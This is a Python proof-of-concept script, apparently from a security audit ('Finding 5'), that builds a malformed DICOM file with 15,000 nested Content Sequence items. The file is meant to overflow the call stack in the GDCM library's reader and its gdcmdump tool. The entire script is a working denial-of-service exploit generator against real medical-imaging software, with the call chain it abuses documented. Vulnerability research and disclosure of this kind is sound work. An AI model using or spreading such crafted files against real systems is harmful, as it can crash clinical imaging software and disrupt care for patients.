#!/usr/bin/env python3
"""
Finding 5 PoC generator - unbounded SQ recursion stack overflow (CWE-674).
No depth limit in DataSet::ReadNested -> Item::Read -> SequenceOfItems::Read.
15000 nested (0040,A730) Content Sequence items exhaust the call stack.

Trigger: gdcm::Reader::Read() (also crashes gdcmdump), before any pixel access.

Call chain per nesting level:
  DataSet::Read -> ExplicitDataElement::ReadValue -> SequenceOfItems::Read
    -> Item::Read -> DataSet::ReadNested -> DataElement::Read -> recurses
"""

import struct
import os
import sys

OUTPUT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "c2_sq_recursion.dcm")
NESTING_LEVELS = 15000

def pad_uid(uid):
    b = uid.encode('ascii')
    if len(b) % 2 != 0:
        b += b'\x00'
    return b

def make_explicit_tag(group, element, vr, value_bytes):
    # Long VRs (OB, OW, OF, SQ, UC, UN, UR, UT) use a 4-byte length field;
    # all others use 2-byte VR + 2-byte length.
    long_vrs = {b'OB', b'OW', b'OF', b'SQ', b'UC', b'UN', b'UR', b'UT'}
    vr_bytes = vr.encode('ascii') if isinstance(vr, str) else vr
    length = len(value_bytes)

    tag = struct.pack('<HH', group, element)
    if vr_bytes in long_vrs:
        header = tag + vr_bytes + b'\x00\x00' + struct.pack('<I', length)
    else:
        header = tag + vr_bytes + struct.pack('<H', length)
    return header + value_bytes

def make_sq_open(group, element):
    # SQ tag, Explicit VR, undefined length (0xFFFFFFFF)
    tag = struct.pack('<HH', group, element)
    return tag + b'SQ' + b'\x00\x00' + struct.pack('<I', 0xFFFFFFFF)

def make_item_open():
    # Item tag (FFFE,E000), undefined length
    return struct.pack('<HH', 0xFFFE, 0xE000) + struct.pack('<I', 0xFFFFFFFF)

def make_item_delim():
    # Item Delimitation Item (FFFE,E00D), length=0
    return struct.pack('<HH', 0xFFFE, 0xE00D) + struct.pack('<I', 0x00000000)

def make_seq_delim():
    # Sequence Delimitation Item (FFFE,E0DD), length=0
    return struct.pack('<HH', 0xFFFE, 0xE0DD) + struct.pack('<I', 0x00000000)

def build_dicom_file(nesting_levels):
    buf = bytearray()

    # 1. Preamble: 128 zero bytes + "DICM"
    buf += b'\x00' * 128
    buf += b'DICM'

    # 2. File Meta Information (group 0002)
    # Build all meta elements first to compute GroupLength
    sop_class_uid = pad_uid("1.2.840.10008.5.1.4.1.1.88.33")
    sop_instance_uid = pad_uid("1.2.3.4.5.6.7.8.9")
    transfer_syntax_uid = pad_uid("1.2.840.10008.1.2.1")
    impl_class_uid = pad_uid("1.2.3.4.5.6.7.8")

    meta_elements = bytearray()
    # (0002,0001) OB FileMetaInformationVersion
    meta_elements += make_explicit_tag(0x0002, 0x0001, 'OB', b'\x00\x01')
    # (0002,0002) UI MediaStorageSOPClassUID
    meta_elements += make_explicit_tag(0x0002, 0x0002, 'UI', sop_class_uid)
    # (0002,0003) UI MediaStorageSOPInstanceUID
    meta_elements += make_explicit_tag(0x0002, 0x0003, 'UI', sop_instance_uid)
    # (0002,0010) UI TransferSyntaxUID
    meta_elements += make_explicit_tag(0x0002, 0x0010, 'UI', transfer_syntax_uid)
    # (0002,0012) UI ImplementationClassUID
    meta_elements += make_explicit_tag(0x0002, 0x0012, 'UI', impl_class_uid)

    # (0002,0000) UL FileMetaInformationGroupLength = length of all meta elements above
    group_length = len(meta_elements)
    buf += make_explicit_tag(0x0002, 0x0000, 'UL', struct.pack('<I', group_length))
    buf += meta_elements

    # 3. Dataset
    # (0008,0016) UI SOPClassUID
    buf += make_explicit_tag(0x0008, 0x0016, 'UI', sop_class_uid)
    # (0008,0018) UI SOPInstanceUID
    buf += make_explicit_tag(0x0008, 0x0018, 'UI', sop_instance_uid)

    # 4. Deeply nested SQ structure
    # Use tag (0040,A730) Content Sequence — a standard public SQ tag
    # used in Structured Report IODs. This makes the PoC semantically
    # valid DICOM rather than relying on a private creator slot.
    #
    # The structure is:
    #   SQ open (0040,A730)
    #     Item open
    #       SQ open (0040,A730)
    #         Item open
    #           SQ open ...
    #             Item open
    #             Item delim    <- innermost
    #           Seq delim
    #         Item delim
    #       Seq delim
    #     Item delim
    #   Seq delim

    opening_tags = bytearray()
    closing_tags = bytearray()

    print(f"Building {nesting_levels} nesting levels...")
    for i in range(nesting_levels):
        opening_tags += make_sq_open(0x0040, 0xA730)
        opening_tags += make_item_open()
        # closing in reverse order
        closing_tags = make_item_delim() + make_seq_delim() + closing_tags

    buf += opening_tags
    buf += closing_tags

    return bytes(buf)


def main():
    data = build_dicom_file(NESTING_LEVELS)

    with open(OUTPUT_FILE, 'wb') as f:
        f.write(data)

    print(f"Written: {OUTPUT_FILE}")
    print(f"File size: {len(data)} bytes ({len(data) / 1024:.1f} KB), "
          f"{NESTING_LEVELS} nesting levels x 36 bytes/level")


if __name__ == '__main__':
    main()
